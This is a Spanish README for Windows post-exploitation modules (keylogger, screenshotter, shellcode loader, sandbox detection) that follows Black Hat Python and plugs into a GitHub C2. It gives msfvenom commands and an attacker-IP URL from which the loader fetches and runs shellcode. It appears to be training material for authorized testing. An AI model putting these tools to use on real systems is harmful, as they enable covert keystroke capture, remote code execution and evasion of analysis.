# Tareas habituales con troyanos en Windows

Módulos de post-explotación para Windows, construidos siguiendo el capítulo 8
de *Black Hat Python*. Están pensados para integrarse como módulos en la
plataforma C2 de GitHub del capítulo 7 (cada uno expone una función `run()`).

## Aviso legal

Uso exclusivo en pruebas de penetración autorizadas, auditorías con permiso
explícito por escrito o laboratorios propios. Ejecutar esto contra sistemas de
terceros sin autorización es ilegal.

## Requisitos

Solo funcionan en **Windows** (usan `ctypes.windll` y la API nativa):

```
pip install pywin32 pyWinhook
```

## Módulos

| Script | Qué hace |
|---|---|
| `keylogger.py` | Registra pulsaciones de teclas con PyWinHook (`SetWindowsHookEx`). Identifica la ventana/proceso activo y vuelca el portapapeles al detectar un pegado (Ctrl+V). |
| `screenshotter.py` | Captura toda la pantalla (varios monitores) vía GDI y la guarda como `.bmp`. |
| `shell_exec.py` | Descarga shellcode en base64 desde un servidor web, lo escribe en memoria ejecutable (`VirtualAlloc` + `RtlMoveMemory`) y lo ejecuta con `ctypes.cast`. |
| `sandbox_detect.py` | Detección de entorno de pruebas: mide el tiempo desde la última entrada de usuario (`GetLastInputInfo`) frente al tiempo de arranque (`GetTickCount`). |

## Generar shellcode de prueba (para `shell_exec.py`)

Desde la máquina Linux (atacante):

```
msfvenom -p windows/exec -e x86/shikata_ga_nai -i 1 -f raw cmd=calc.exe > shellcode.raw
base64 -w 0 -i shellcode.raw > shellcode.bin
python -m http.server 8100
```

Luego ajusta la `url` en `shell_exec.py` a `http://<IP_ATACANTE>:8100/shellcode.bin`
y ejecútalo en la máquina Windows.
